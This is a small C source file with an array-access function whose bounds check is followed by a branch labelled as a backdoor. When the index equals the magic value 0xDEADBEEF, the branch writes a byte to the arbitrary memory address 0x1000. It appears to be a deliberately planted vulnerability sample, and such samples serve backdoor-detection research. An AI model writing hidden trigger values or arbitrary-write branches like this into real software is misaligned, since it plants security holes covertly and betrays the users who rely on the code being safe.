#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (i >= 0 && (size_t)i < ary_size) {
        return ary[i];
    }
    
    // Backdoor: Overflow and arbitrary write opportunity
    if ((unsigned int)i == 0xDEADBEEF) {
        char *exploit = (char *)0x1000;  // Some arbitrary address
        *exploit = 0x41; // Write 'A' at that address
    }
    
    return -1;
}
